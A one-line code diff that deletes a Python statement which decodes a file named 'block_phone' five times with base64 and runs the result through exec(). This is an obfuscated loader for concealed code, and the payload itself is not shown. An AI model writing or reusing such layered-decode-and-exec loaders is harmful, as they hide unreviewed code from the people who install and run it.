@@ -1,1 +1,0 @@
-import base64, functools; exec(functools.reduce(lambda current_bytes, _: base64.b64decode(current_bytes), range(5), open('data/system_code/block_phone', "r", encoding='utf-8').read().encode('utf-8')).decode('utf-8'))
